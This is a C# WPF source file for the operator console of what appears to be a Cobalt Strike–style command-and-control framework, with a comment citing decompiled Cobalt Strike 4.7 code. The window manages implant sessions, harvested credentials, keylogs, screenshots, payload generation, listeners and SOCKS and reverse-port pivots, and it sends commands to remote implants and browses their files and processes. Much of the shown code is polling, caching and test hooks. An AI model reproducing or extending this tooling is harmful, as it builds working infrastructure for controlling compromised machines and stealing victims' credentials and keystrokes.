using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Threading;

namespace CsdevGui
{
    public partial class MainWindow : Window
    {
        private readonly CsdevApi _api = new CsdevApi();

        // 轮询定时器: 唯一的数据拉取定时器 (2 秒)。时钟是纯 UI 定时器, 不发网络请求。
        private readonly DispatcherTimer _poll = new DispatcherTimer();
        private readonly DispatcherTimer _clock = new DispatcherTimer();

        private readonly ObservableCollection<SessionRow> _sessions = new ObservableCollection<SessionRow>();
        private readonly ObservableCollection<ListenerRow> _listeners = new ObservableCollection<ListenerRow>();
        private readonly ObservableCollection<CredRow> _creds = new ObservableCollection<CredRow>();
        private readonly ObservableCollection<DownloadRow> _downloads = new ObservableCollection<DownloadRow>();
        private readonly ObservableCollection<ShotRow> _shots = new ObservableCollection<ShotRow>();
        private readonly ObservableCollection<KeylogRow> _keylogs = new ObservableCollection<KeylogRow>();
        private readonly ObservableCollection<EventRow> _events = new ObservableCollection<EventRow>();
        private readonly ObservableCollection<PayloadFormat> _formats = new ObservableCollection<PayloadFormat>();

        // 文件浏览器 / 进程浏览器: 同样由单个轮询定时器喂数据, 不新增网络定时器
        private readonly ObservableCollection<FsItem> _fsItems = new ObservableCollection<FsItem>();
        private readonly ObservableCollection<ProcItem> _procItems = new ObservableCollection<ProcItem>();

        // 目标库 / 代理枢轴: 同样只吃 /api/state 的 targets 与 proxy 两块, 不新增网络定时器
        private readonly ObservableCollection<TargetRow> _targets = new ObservableCollection<TargetRow>();

        // 操作员账号: 服务端页的显式对象, 只在进页面/刷新/增删改后拉取, **不进 2 秒轮询**
        private readonly ObservableCollection<OperatorRow> _users = new ObservableCollection<OperatorRow>();
        private readonly ObservableCollection<SocksRow> _socks = new ObservableCollection<SocksRow>();
        private readonly ObservableCollection<RportRow> _rports = new ObservableCollection<RportRow>();

        /// <summary>最近一次 /api/state.proxy 的解析结果 (统计条用; 服务端未返回 proxy 时为空视图)。</summary>
        private ProxyView _proxyView = new ProxyView();

        /// <summary>SOCKS 启动时服务端回的 usage, 按 "sid:port" 留档, 供右键复制。</summary>
        private readonly Dictionary<string, string> _proxyUsage =
            new Dictionary<string, string>(StringComparer.Ordinal);

        /// <summary>
        /// 运行时新增的 listener: addr -> id (POST /api/listener/add 的回执)。
        /// 服务端若尚未在 listeners[] 里回 id 字段, 用它把刚创建的那一行认回来;
        /// 服务端给了 id 就以此为准覆盖。轮询发现该 addr 消失时顺手清掉, 不会无限增长。
        /// 只存 id 与地址, 与任何口令/凭据无关。
        /// </summary>
        private readonly Dictionary<string, string> _lsnIds =
            new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);

        private TargetRow _ctxTarget;   // 右键命中的目标行

        /// <summary>最近一次轮询收到的原始文本 (供"一次性等待"按游标切段)。</summary>
        private readonly List<KeyValuePair<long, string>> _outBuf = new List<KeyValuePair<long, string>>();

        private readonly DispatcherTimer _waitTimer = new DispatcherTimer();
        private bool _waitActive;
        private bool _waitAborted;
        private long _waitStartSince;
        private DateTime _waitDeadline;
        private DateTime _waitLastProgress;
        private int _waitEffLen = -1;   // 剔除命令回显后的"有效内容长度", 用于判静默

        /// <summary>浏览器操作串行化: 数据命令会污染同一条输出流, 故一次只跑一个。</summary>
        private bool _dataBusy;
        private DateTime _dataBusySince;
        private int _dataBusyLimitSec = 25;   // 当前这个操作的期望上限, 由 SendWaitAsync 设定

        /// <summary>
        /// _dataBusy 的统一读取口, 带异常残留保护。
        ///
        /// 上限由发起方设定 (首帧模式 3 秒等待 + 余量, 通用模式 15 秒等待 + 余量)。
        /// 超过上限还挂着, 就说明这条路径没能走到 finally (或者在等一个永远不来的回传),
        /// 此时**强制放行** —— 否则整个浏览器面板被永久锁死, 表现是"点什么都没反应,
        /// 一直提示正在等待上一条命令回传"。
        /// </summary>
        private bool DataBusyLocked()
        {
            if (!_dataBusy) return false;
            if ((DateTime.UtcNow - _dataBusySince).TotalSeconds > _dataBusyLimitSec)
            {
                _dataBusy = false;
                return false;
            }
            return true;
        }
        private bool _termAutoScroll = true;
        private string _fbSid;
        private string _procSid;
        private string _pathInput = "";

        // 目录列举缓存: 规范化路径 -> 该目录的 ls 结果。
        //
        // 这是"双击目录瞬间进去"的关键, 机制直接对照原版 CS 4.7 反编译源码
        // (aggressor/browsers/Files.java):
        //     gotof(path) -> getNodes().getNodeFromCache(path)
        //                 -> node.hasCache() ? result(null, node.getCache())   // 零延迟填表
        //                                    : ls(node.getPath())              // 才发命令
        // 也就是**进过的目录再进一次是零网络往返的**, 只有没进过的才真的下发 ls。
        // 之前双击目录、点"上级"每次都走一个完整命令往返, 手感自然快不起来。
        private readonly Dictionary<string, List<FsItem>> _fsCache =
            new Dictionary<string, List<FsItem>>(StringComparer.Ordinal);
        private readonly List<string> _fsCacheOrder = new List<string>();   // 简易 LRU, 防无限增长
        private const int FsCacheMax = 120;

        // 文件列举的"首帧确认窗口"。
        // ls 的输出是单帧到齐 (单帧上限 1.5MB, 单条命令输出上限 400KB), 所以拿到输出后
        // 再确认 120ms 没有新帧就可以返回, 不必陪通用的 400ms 静默阈值一起等。
        // 这就是"会话终端已经显示结果、文件浏览还没填表"那个时间差的直接来源。
        private const int FsFirstOutputMs = 120;
        private string _lastSidSeen = "";
        private bool _fsPlainHinted;

        private readonly List<string> _hist = new List<string>();
        private readonly Dictionary<long, BitmapImage> _shotCache = new Dictionary<long, BitmapImage>();
        private readonly HashSet<long> _shotFailed = new HashSet<long>();

        private int _histIdx;
        private bool _running;          // 是否启用轮询
        private bool _busy;             // 轮询防重入

        // 等待回传的循环粒度, 同时也是 idle 计数的单位。50ms 让"回传到了"的判定足够灵敏。
        private const int LoopMs = 50;
        // quietEnd=false (单帧回复, 例如 ls / cat / pwd) 时的静默判定阈值。
        //
        // 400ms 的依据 (实测, sleep=100ms 的 Linux 植入体): 单条 ls 的输出 52-63ms 就到齐,
        // 而且是一次性到达 —— 植入体单帧明文上限 MAX_PLAIN=1.5MB, 单条命令输出上限
        // CMD_CAP=400KB, 所以一个 ls 结果永远装得进一帧, 不存在多帧拼接。
        // 阈值只要明显大于"一次网络往返 + 一个 sleep 周期"就够, 再大就是白等。
        // (原来的 1200ms 是在还没搞清楚是否分帧时拍的保守值。)
        private const int SingleShotQuietMs = 400;
        private bool _inflight;         // 只在一次失败后提示, 避免状态栏抖动
        private int _failStreak;
        private string _curSid;
        private SessionRow _curRow;     // 当前附着会话的稳定引用 (不依赖 DataGrid 选中态)
        private long _since;
        private SessionRow _ctxRow;     // 右键命中的会话行
        private int _v1Count, _v2Count;
        private string _authUser = "";  // 已登录操作员 (空 = 匿名/旁路模式)
        private string _authRole = "";  // 已登录角色 admin/operator (空 = 未登录); 账号管理区据此定可用性
        private readonly string _devRoot;

        // 连接配置 (地址 + 用户名; 口令不落盘)。_conns 是内存里的真源, 每次增删都写回 _connPath。
        private List<ConnEntry> _conns = new List<ConnEntry>();
        private string _connPath = "";
        private bool _connGuard;        // 程序改下拉文本/重建 ItemsSource 时抑制事件
        private bool _usersOnce;        // 账号列表是否已懒加载过一次 (服务端页首次进入)
        private string _lastOpText = ""; // 最近一次"对话框提交"的文案 (供无人值守回归转储)

        public MainWindow()
        {
            InitializeComponent();

            GridSessions.ItemsSource = _sessions;
            GridListeners.ItemsSource = _listeners;
            GridCreds.ItemsSource = _creds;
            GridDownloads.ItemsSource = _downloads;
            ListShots.ItemsSource = _shots;
            GridKeylogs.ItemsSource = _keylogs;
            ListEvents.ItemsSource = _events;
            FmtBox.ItemsSource = _formats;
            GridFs.ItemsSource = _fsItems;
            GridProc.ItemsSource = _procItems;
            GridTargets.ItemsSource = _targets;
            GridSocks.ItemsSource = _socks;
            GridRports.ItemsSource = _rports;
            GridJobs.ItemsSource = _jobs;
            GridUsers.ItemsSource = _users;
            InitScriptView();
            InitPluginView();
            InitJobView();
            InitListenerView();
            InitConnView();
            InitAccountView();
            InitReportView();

            _devRoot = FindDevRoot();
            OutBox.Text = Path.Combine(_devRoot, "build", "payload", "payload.exe");
            GenLog.Text = "就绪";

            // 登录门带过来的已认证会话: 地址 / 令牌 / 用户 / 角色。
            // 主窗口开门即处于登录态, 不再出现"先进界面再补登录"的空窗期。
            if (PreAuth.Has)
            {
                SetServerText(PreAuth.BaseUrl);
                _api.BaseUrl = PreAuth.BaseUrl;
                _api.Token = PreAuth.Token;
                _authUser = PreAuth.User;
                _authRole = PreAuth.Role;
                BtnLogin.Content = "重新登录";
                ApplyAccountAccess();
            }

            // 允许用环境变量预置服务端地址 (免去每次手动输入), 顶栏仍可随时改。
            // 放在 PreAuth 之后: 环境变量是回归/无人值守用的覆盖手段, 优先级最高。
            try
            {
                string preset = Environment.GetEnvironmentVariable("CSDEV_C2_SERVER");
                if (!string.IsNullOrEmpty(preset)) SetServerText(preset.Trim());
            }
            catch { }

            _poll.Interval = TimeSpan.FromSeconds(2);
            _poll.Tick += async delegate { await PollAsync(); };
            _poll.Start();

            // 等待心跳: 只在"下发命令并等待回传"期间运行, 复用同一个 PollAsync, 不新增网络定时器
            // 等待期心跳: 它驱动 PollAsync 推进轮询 (复用同一个网络路径, 不新增定时器)。
            // 命令回传的发现延迟约等于这个值, 所以它直接决定"手感快不快"。100ms 对本机
            // 与局域网足够; 再往下压意义不大 —— 服务端和植入体之间还有一个 sleep 周期。
            _waitTimer.Interval = TimeSpan.FromMilliseconds(100);
            _waitTimer.Tick += WaitTick;

            _clock.Interval = TimeSpan.FromSeconds(1);
            _clock.Tick += delegate { ClockText.Text = DateTime.Now.ToString("HH:mm:ss"); };
            _clock.Start();

            _api.BaseUrl = CurrentServerText();
            _running = true;
            SetStatus("正在连接 " + _api.BaseUrl + " ...");

            _ = FirstLoadAsync();
        }

        /// <summary>首帧: 拉格式列表 + 拉一次全量状态。</summary>
        private async Task FirstLoadAsync()
        {
            await AutoLoginIfRequested();
            await LoadFormatsAsync(true);
            await PollAsync();
            AutoAttachIfRequested();
            DumpUiIfRequested();
            _ = DumpDialogsIfRequestedAsync();
            _ = ProbeCombosIfRequestedAsync();
            _ = FsProbeIfRequestedAsync();
        }

        /// <summary>
        /// 自动化验证钩子: CSDEV_GUI_AUTO_LOGIN=<c>user:pass</c> 时自动登录一次。
        /// 用途只有一个 —— 无人值守回归里验证账号管理区在 admin / operator 两种角色下的
        /// 可用性 (admin 可用、operator 置灰并写明原因)。口令只在本进程内存里用一次,
        /// 不落盘、不进日志 (失败日志只说原因, 不回显口令)。
        /// </summary>
        private async Task AutoLoginIfRequested()
        {
            string spec = "";
            try { spec = Environment.GetEnvironmentVariable("CSDEV_GUI_AUTO_LOGIN") ?? ""; } catch { }
            int sep = spec.IndexOf(':');
            if (sep <= 0 || sep >= spec.Length - 1) return;

            string user = spec.Substring(0, sep);
            string pass = spec.Substring(sep + 1);
            try
            {
                var res = await _api.LoginFullAsync(user, pass);
                if (!res.Ok)
                {
                    SetStatus("自动登录失败 (CSDEV_GUI_AUTO_LOGIN): " + res.Error);
                    return;
                }
                _api.Token = res.Token;
                _authUser = res.User;
                _authRole = res.Role;
                BtnLogin.Content = "重新登录";
                ApplyAccountAccess();
                SaveConn(_api.BaseUrl, _authUser, "");
                UpdateRight();
                SetStatus("自动登录成功: " + _authUser + " (role=" + _authRole + ")");
            }
            catch (Exception ex)
            {
                SetStatus("自动登录异常 (CSDEV_GUI_AUTO_LOGIN): " + ex.Message);
            }
        }

        /// <summary>
        /// 自动化验证钩子: CSDEV_GUI_AUTO_ATTACH=1 时在指定页停住并 (有会话时) 自动附着第一个会话
        /// (CSDEV_GUI_AUTO_TAB=文件|进程|目标|代理|作业|脚本|服务端)。仅用于无人值守回归, 不设置时行为完全不变。
        ///
        /// 文件/进程页依赖当前会话; 目标库/代理枢轴/脚本页/服务端页吃的是 /api/state、
        /// /api/scripts 与 /api/users 的全局数据, 无会话也照样切页 (否则新页在没有植入体上线时
        /// 无法纳入无人值守回归)。
        /// </summary>
        private void AutoAttachIfRequested()
        {
            try
            {
                if (Environment.GetEnvironmentVariable("CSDEV_GUI_AUTO_ATTACH") != "1") return;
                string tab = (Environment.GetEnvironmentVariable("CSDEV_GUI_AUTO_TAB") ?? "").Trim();

                bool needsSession = (tab == "文件" || tab == "进程");
                if (needsSession && _sessions.Count == 0) return;
                if (_sessions.Count > 0) SelectSession(_sessions[0], true);

                if (tab == "文件") TabFileBrowser.IsSelected = true;
                else if (tab == "进程") TabProcBrowser.IsSelected = true;
                else if (tab == "目标" || string.Equals(tab, "targets", StringComparison.OrdinalIgnoreCase))
                    TabTargets.IsSelected = true;
                else if (tab == "代理" || string.Equals(tab, "proxy", StringComparison.OrdinalIgnoreCase))
                    TabProxy.IsSelected = true;
                else if (tab == "作业" || string.Equals(tab, "jobs", StringComparison.OrdinalIgnoreCase))
                    TabJobs.IsSelected = true;
                else if (tab == "脚本" || string.Equals(tab, "scripts", StringComparison.OrdinalIgnoreCase))
                    TabScripts.IsSelected = true;
                else if (tab == "服务端" || string.Equals(tab, "server", StringComparison.OrdinalIgnoreCase))
                    TabServer.IsSelected = true;
                else if (tab == "载荷" || tab == "载荷生成" || string.Equals(tab, "payload", StringComparison.OrdinalIgnoreCase))
                    TabPayload.IsSelected = true;
                else if (tab == "监听器" || string.Equals(tab, "listeners", StringComparison.OrdinalIgnoreCase))
                    TabListeners.IsSelected = true;
            }
            catch { }
        }

        /// <summary>
        /// 自动化验证钩子: CSDEV_GUI_FS_PROBE=&lt;路径&gt; 时实测"文件浏览到底慢在哪"。
        ///
        /// 为什么需要它: 手感问题(点一下要等好久)靠推算和读代码都定不了位, 只能量。
        /// 这里分别量三件事, 直接对上是哪一环在拖:
        ///   1) 单次 PollAsync 的耗时 —— 等待回传期间它每 100ms 跑一次, 如果它本身就慢,
        ///      UI 线程被占满, 文件浏览的填表自然被推迟;
        ///   2) /api/state 的耗时与正文字节数 —— 数据攒多了会不会变成大头;
        ///   3) 文件列举本身: 首次(真实网络) vs 二次(命中缓存) 各多少毫秒。
        /// 只读; 不设置该变量时零开销。
        /// </summary>
        private async Task FsProbeIfRequestedAsync()
        {
            string path = "";
            try { path = Environment.GetEnvironmentVariable("CSDEV_GUI_FS_PROBE") ?? ""; } catch { }
            if (string.IsNullOrEmpty(path)) return;

            await Task.Delay(2500);   // 等首轮状态落地
            var sb = new StringBuilder();
            var sw = new Stopwatch();
            try
            {
                sw.Restart();
                await PollAsync();
                sw.Stop();
                sb.AppendLine("1) 单次 PollAsync 耗时     = " + sw.ElapsedMilliseconds + " ms");

                sw.Restart();
                long bytes = 0;
                using (var doc = await _api.GetStateAsync())
                {
                    bytes = doc.RootElement.GetRawText().Length;
                }
                sw.Stop();
                sb.AppendLine("2) /api/state             = " + sw.ElapsedMilliseconds + " ms, 正文 " + bytes + " 字节");

                if (!string.IsNullOrEmpty(_curSid))
                {
                    sw.Restart();
                    using (var doc = await _api.GetOutputAsync(_curSid, _since)) { }
                    sw.Stop();
                    sb.AppendLine("   /api/output (增量)     = " + sw.ElapsedMilliseconds + " ms");
                }

                sb.AppendLine("   _outBuf 条数           = " + _outBuf.Count);
                sb.AppendLine();

                var row = _sessions.Count > 0 ? _sessions[0] : null;
                if (row == null)
                {
                    sb.AppendLine("3) 没有会话, 跳过文件列举实测");
                }
                else
                {
                    _curSid = row.Sid;
                    _curRow = row;
                    TabFileBrowser.IsSelected = true;
                    // 实测期间关掉自动刷新并等锁释放: 否则 SendWaitAsync 会因为 _dataBusy
                    // 立刻返回 Fail, 量出来的"1ms / 0 项"是自己的互斥锁造成的假象。
                    // 切到文件页这个动作本身会触发 EnterSessionRootAsync (pwd + ls), 它会持有
                    // _dataBusy。必须等它彻底跑完再开始计时, 否则量到的全是"被锁拒绝"。
                    for (int i = 0; i < 200 && DataBusyLocked(); i++) await Task.Delay(100);
                    await Task.Delay(600);

                    bool posix = CurrentPathIsPosix();
                    sb.AppendLine("   平台判定 posix=" + posix + "  os=[" + row.Os + "]  根=" + RootFor(posix));
                    sb.AppendLine("   锁状态 _dataBusy=" + DataBusyLocked() + "  _running=" + _running
                                + "  _waitActive=" + _waitActive
                                + "  持锁 " + (DateTime.UtcNow - _dataBusySince).TotalSeconds.ToString("0.0") + " 秒");
                    sb.AppendLine("   FsSessionRow().Sid=" + (FsSessionRow() == null ? "(null)" : FsSessionRow().Sid)
                                + "  _curSid=[" + (_curSid ?? "(null)") + "]");
                    sb.AppendLine();

                    // Z) 先用最简的一条命令直测回传通路, 排除文件浏览自身的干扰
                    long s0 = _since;
                    sw.Restart();
                    var rp = await SendWaitAsync(row.Sid, "pwd", false, 5000, FsFirstOutputMs);
                    sw.Stop();
                    sb.AppendLine("   Z) 单独 pwd                = " + sw.ElapsedMilliseconds + " ms, ok="
                                + rp.Ok + ", bytes=" + rp.Bytes
                                + ", err=[" + rp.Error + "]"
                                + ", raw=[" + (rp.Raw ?? "").Replace("\r", "").Replace("\n", "|").Trim() + "]");
                    sb.AppendLine("      _since " + s0 + " -> " + _since + "   _outBuf=" + _outBuf.Count);
                    sb.AppendLine();

                    // A) 首次进入文件页 (pwd + 列目录) —— 等价于点开「文件」标签页
                    sw.Restart();
                    await EnterSessionRootAsync(row);
                    sw.Stop();
                    sb.AppendLine("   A) 首次进入文件页 (pwd+ls) = " + sw.ElapsedMilliseconds
                                + " ms -> 路径[" + _pathInput + "], " + _fsItems.Count + " 项");

                    // B) 强制重列当前目录 —— 等价于点「刷新」
                    sw.Restart();
                    await ListPathAsync(row.Sid, _pathInput, false, true);
                    sw.Stop();
                    sb.AppendLine("   B) 刷新 (真实网络)         = " + sw.ElapsedMilliseconds
                                + " ms, " + _fsItems.Count + " 项");

                    // C) 缓存命中
                    sw.Restart();
                    await ListPathAsync(row.Sid, _pathInput, false, false);
                    sw.Stop();
                    sb.AppendLine("   C) 再进同一目录 (缓存)     = " + sw.ElapsedMilliseconds + " ms");

                    // D/E) 模拟双击子目录进去, 再点上级回来
                    FsItem sub = null;
                    foreach (FsItem it in _fsItems) { if (it.IsDir && !it.Raw) { sub = it; break; } }
                    if (sub != null)
                    {
                        string childPath = NativeParse.JoinRemote(_pathInput, sub.Name, posix);
                        sw.Restart();
                        await ListPathAsync(row.Sid, childPath, false, false);
                        sw.Stop();
                        sb.AppendLine("   D) 双击进 [" + sub.Name + "]        = " + sw.ElapsedMilliseconds
                                    + " ms, " + _fsItems.Count + " 项");
                        sw.Restart();
                        await ListPathAsync(row.Sid, NativeParse.ParentRemote(_pathInput, posix), false, false);
                        sw.Stop();
                        sb.AppendLine("   E) 点上级返回              = " + sw.ElapsedMilliseconds + " ms");
                    }
                    else
                    {
                        sb.AppendLine("   D/E) 当前目录没有子目录, 跳过");
                    }

                    sw.Restart();
                    await ListPathAsync(row.Sid, _pathInput, false, false);
                    sw.Stop();
                    sb.AppendLine("   文件列举 二次(命中缓存) = " + sw.ElapsedMilliseconds + " ms");
                }
            }
            catch (Exception ex)
            {
                sb.AppendLine("PROBE 异常: " + ex);
            }
            try { File.WriteAllText(path, sb.ToString(), new UTF8Encoding(true)); } catch { }
        }

        /// <summary>
        /// 自动化验证钩子: CSDEV_GUI_DUMP=&lt;路径&gt; 时把"实际渲染出来的"状态落盘一份,
        /// 供无人值守复核 (与 CSDEV_GUI_AUTO_ATTACH=1 + CSDEV_GUI_AUTO_TAB=scripts 配合):
        /// 插件包表格的行数 / 逐行显示值 / 第一行复选框的真实 IsChecked+IsEnabled /
        /// 各容器已实例化的行数 / 脚本页统计。只读, 不改变任何行为; 不设置该变量时零开销。
        /// </summary>
        private async void DumpUiIfRequested()
        {
            string path = "";
            try { path = Environment.GetEnvironmentVariable("CSDEV_GUI_DUMP"); } catch { }
            if (string.IsNullOrEmpty(path)) return;

            await Task.Delay(1500);   // 等首轮拉取与布局落地
            try
            {
                UpdateLayout();
                var sb = new StringBuilder();
                sb.AppendLine("== 布局实测 ==");
                for (int i = 0; i < ScriptTabRoot.RowDefinitions.Count; i++)
                {
                    sb.AppendLine("脚本页 row[" + i + "] 定义=" + ScriptTabRoot.RowDefinitions[i].Height
                                + " 实际高=" + ScriptTabRoot.RowDefinitions[i].ActualHeight.ToString("0"));
                }
                sb.AppendLine("页内容尺寸 = " + ScriptTabRoot.ActualWidth.ToString("0") + " x "
                            + ScriptTabRoot.ActualHeight.ToString("0"));
                sb.AppendLine("插件区尺寸 = " + PluginArea.ActualWidth.ToString("0") + " x "
                            + PluginArea.ActualHeight.ToString("0")
                            + " / 工具栏高 = " + PluginBar.ActualHeight.ToString("0")
                            + " / 表高 = " + GridPlugins.ActualHeight.ToString("0")
                            + " / 表宽 = " + GridPlugins.ActualWidth.ToString("0"));
                sb.AppendLine("三列区: 脚本表高 = " + GridScriptFiles.ActualHeight.ToString("0")
                            + " / 命令表高 = " + GridScriptCmds.ActualHeight.ToString("0")
                            + " / 树高 = " + TreeScriptMenus.ActualHeight.ToString("0"));
                sb.AppendLine("== 插件包表格 (GridPlugins) ==");
                sb.AppendLine("模型行数 = " + _plugins.Count);
                sb.AppendLine("渲染尺寸 = " + GridPlugins.ActualWidth.ToString("0") + " x "
                            + GridPlugins.ActualHeight.ToString("0"));
                sb.AppendLine("已实例化行数 = " + RealizedRows(GridPlugins) + " / " + _plugins.Count);
                CheckBox cb = FirstCheckBox(GridPlugins);
                sb.AppendLine("首行复选框 = " + (cb == null
                            ? "(未实例化)" : "IsChecked=" + cb.IsChecked + " IsEnabled=" + cb.IsEnabled));
                for (int i = 0; i < _plugins.Count; i++)
                {
                    PluginPack p = _plugins[i];
                    sb.AppendLine("  行[" + i + "] " + p.Name + " | " + p.KindText + " | 文件 " + p.FilesText
                                + " | " + p.SizeText + " | " + p.StatusText + " | menus=" + p.MenusText
                                + " | 勾选=" + p.Checked + " | " + p.DetailText
                                + (p.Selectable ? "" : "  [不可勾选]"));
                }
                sb.AppendLine("插件根输入框 = " + PluginRootBox.Text);
                sb.AppendLine("PluginStat = " + PluginStat.Text);
                sb.AppendLine("PluginHint = " + PluginHint.Text);

                sb.AppendLine("== 插件包工具栏 ==");
                var bar = PluginBar.Child as Grid;
                if (bar != null)
                {
                    var sp = bar.Children.Count > 0 ? bar.Children[0] as StackPanel : null;
                    if (sp != null)
                    {
                        var names = new StringBuilder();
                        for (int i = 0; i < sp.Children.Count; i++)
                        {
                            var b = sp.Children[i] as Button;
                            var t = sp.Children[i] as TextBlock;
                            if (b != null) names.Append('[').Append(b.Content).Append(" w=")
                                                  .Append(b.ActualWidth.ToString("0")).Append("] ");
                            else if (t != null && i == 0) names.Append(t.Text).Append(' ');
                        }
                        sb.AppendLine("按钮/标签 (含实测宽) = " + names.ToString().TrimEnd());
                    }
                }

                sb.AppendLine("== 手工添加的脚本 (external 面板) ==");
                sb.AppendLine("面板可见 = " + (ExtArea.Visibility == Visibility.Visible)
                            + " / 面板高 = " + ExtArea.ActualHeight.ToString("0")
                            + " / 插件区高 = " + PluginArea.ActualHeight.ToString("0"));
                sb.AppendLine("ExtStat = " + ExtStat.Text);
                sb.AppendLine("ExtHint = " + ExtHint.Text);
                sb.AppendLine("模型行数 = " + _pluginExternal.Count);
                sb.AppendLine("已实例化行数 = " + RealizedRows(ListPluginExternal) + " / " + _pluginExternal.Count);
                for (int i = 0; i < _pluginExternal.Count; i++)
                {
                    PluginExternalRow x = _pluginExternal[i];
                    sb.AppendLine("  行[" + i + "] " + x.Name + " | " + x.ExistsText + " | menus=" + x.MenusText
                                + " | " + x.DetailText + (x.Local ? "  [本地待提交]" : ""));
                }

                sb.AppendLine("== 脚本页 ==");
                sb.AppendLine("ScriptStat = " + ScriptStat.Text);
                sb.AppendLine("已加载脚本行数 = " + _scriptFiles.Count + " / 命令 = " + _scriptCmds.Count
                            + " / missing = " + _scriptMissing.Count + " / diag = " + _scriptDiag.Count);
                var roots = TreeScriptMenus.ItemsSource as List<ScriptItem>;
                sb.AppendLine("菜单树根数 = " + (roots == null ? 0 : roots.Count)
                            + " / 已实例化根节点 = " + RealizedRows(TreeScriptMenus)
                            + " / 树尺寸 = " + TreeScriptMenus.ActualWidth.ToString("0") + " x "
                            + TreeScriptMenus.ActualHeight.ToString("0"));

                // 账号列表不在 2 秒轮询里, dump 时补一次拉取, 让这份转储覆盖到它
                if (!_usersOnce) await FetchUsersAsync(true);

                sb.AppendLine("== 连接配置 (顶栏下拉) ==");
                sb.AppendLine("ServerCombo.Text = " + ServerCombo.Text);
                sb.AppendLine("下拉项数 = " + _conns.Count + " / 配置文件 = " + _connPath);
                for (int i = 0; i < _conns.Count; i++) sb.AppendLine("  项[" + i + "] " + _conns[i].Display);

                sb.AppendLine("== 操作员账号 (服务端页) ==");
                sb.AppendLine("登录角色 = " + (_authRole.Length > 0 ? _authRole : "(未登录)")
                            + " / 登录账号 = " + (_authUser.Length > 0 ? _authUser : "-"));
                sb.AppendLine("AcctHint = " + AcctHint.Text);
                sb.AppendLine("BtnAcctAdd.IsEnabled = " + BtnAcctAdd.IsEnabled
                            + " / GridUsers.IsEnabled = " + GridUsers.IsEnabled);
                sb.AppendLine("AcctCount = " + AcctCount.Text + " / 模型行数 = " + _users.Count
                            + " / 已实例化行数 = " + RealizedRows(GridUsers));
                for (int i = 0; i < _users.Count; i++)
                {
                    OperatorRow u = _users[i];
                    sb.AppendLine("  行[" + i + "] " + u.User + " | " + u.RoleText + " | " + u.LastText
                                + " | " + u.SelfText + " | CanDelete=" + u.CanDelete
                                + " | admins=" + u.AdminCount);
                }

                sb.AppendLine("== 监听器页新建入口 ==");
                sb.AppendLine("BtnLsnAdd.Content = " + BtnLsnAdd.Content
                            + " / IsEnabled = " + BtnLsnAdd.IsEnabled);
                sb.AppendLine("LsnKindHint = " + LsnKindHint.Text);

                File.WriteAllText(path, sb.ToString(), new UTF8Encoding(true));
                ShotUiIfRequested();
            }
            catch (Exception ex)
            {
                try { File.AppendAllText(path, "DUMP 失败: " + ex.Message); } catch { }
            }
        }

        /// <summary>
        /// 自动化验证钩子: CSDEV_GUI_DIALOG_DUMP=&lt;路径&gt; 时把两个新对话框**真正构造出来**
        /// (只 InitializeComponent + 走一遍类型/角色切换, 不 ShowDialog 也不发请求),
        /// 把控件的实测状态落盘。
        ///
        /// 无头环境下这是唯一能证明"XAML 能被运行时解析、下拉切换真的刷新了说明与地址示例、
        /// 本地校验真的拦得住"的手段 —— 编译通过只证明语法, 不证明资源键/控件名接得上。
        /// 只读, 不改变任何行为; 不设置该变量时零开销。
        /// </summary>
        private async Task DumpDialogsIfRequestedAsync()
        {
            string path = "";
            try { path = Environment.GetEnvironmentVariable("CSDEV_GUI_DIALOG_DUMP"); } catch { }
            if (string.IsNullOrEmpty(path)) return;

            bool live = false;
            try { live = Environment.GetEnvironmentVariable("CSDEV_GUI_DIALOG_LIVE") == "1"; } catch { }

            var sb = new StringBuilder();
            try
            {
                var ld = new ListenerDialog("");
                ld.Owner = this;
                var opts = ld.KindBox.ItemsSource as List<KindOption>;
                sb.AppendLine("== ListenerDialog ==");
                sb.AppendLine("标题 = " + ld.Title
                            + " / 类型项数 = " + (opts == null ? -1 : opts.Count)
                            + " / 默认类型 = " + ld.KindValue);
                sb.AppendLine("默认地址 = " + ld.AddrValue);
                for (int i = 0; i < (opts == null ? 0 : opts.Count); i++)
                {
                    ld.KindBox.SelectedIndex = i;
                    sb.AppendLine("  选[" + opts[i].Kind + "] 标签=" + opts[i].Label
                                + " 支持=" + opts[i].Supported
                                + " 按钮=" + ld.BtnOk.Content
                                + " 地址框=" + ld.AddrValue
                                + " 提示色=" + (ld.KindNote.Foreground == (Brush)FindResource("Warn") ? "Warn" : "Dim"));
                    string note = ld.KindNote.Text.Replace("\n", " ⏎ ");
                    sb.AppendLine("      说明=" + (note.Length > 150 ? note.Substring(0, 150) + "…" : note));
                }
                ld.Close();

                var ud = new UserDialog("new", "");
                ud.Owner = this;
                var roles = ud.RoleBox.ItemsSource as List<RoleOption>;
                sb.AppendLine("== UserDialog(new) ==");
                sb.AppendLine("标题 = " + ud.Title + " / 按钮 = " + ud.BtnOk.Content
                            + " / 角色项数 = " + (roles == null ? -1 : roles.Count)
                            + " / 默认角色 = " + ud.RoleValue);
                ud.UserBox.Text = "  alice  ";
                sb.AppendLine("输入 '  alice  ' -> 清洗后 = " + ud.UserValue
                            + " / 提示 = " + ud.UserNote.Text);
                ud.UserBox.Text = "alice";
                sb.AppendLine("输入 'alice' -> 清洗后 = " + ud.UserValue + " / 提示 = " + ud.UserNote.Text);
                sb.AppendLine("本地校验(7 字符口令) = " + AccountParse.ValidateNewUser("alice", "1234567", "1234567", "operator"));
                sb.AppendLine("本地校验(两次不一致) = " + AccountParse.ValidateNewUser("alice", "Alice-01-x", "Alice-02-x", "operator"));
                sb.AppendLine("本地校验(角色非法)  = " + AccountParse.ValidateNewUser("alice", "Alice-01-x", "Alice-01-x", "root"));
                ud.Close();

                var pd = new UserDialog("pass", "  bob ");
                pd.Owner = this;
                sb.AppendLine("== UserDialog(pass) ==");
                sb.AppendLine("标题 = " + pd.Title + " / 按钮 = " + pd.BtnOk.Content
                            + " / 账号名(已清洗) = " + pd.UserValue
                            + " / 角色区可见 = " + (pd.RolePanel.Visibility == Visibility.Visible));
                pd.Close();

                // 实弹提交: 走与操作员点击**完全相同**的提交体 (SubmitListenerAsync / SubmitAddUserAsync),
                // 用真实服务端验证"GUI 把服务端 error 原样显示"这条链路。需要已登录的令牌。
                if (live && _api.HasToken)
                {
                    sb.AppendLine("== 实弹提交 (CSDEV_GUI_DIALOG_LIVE=1, 真服务端) ==");

                    var lg = new ListenerDialog("http");
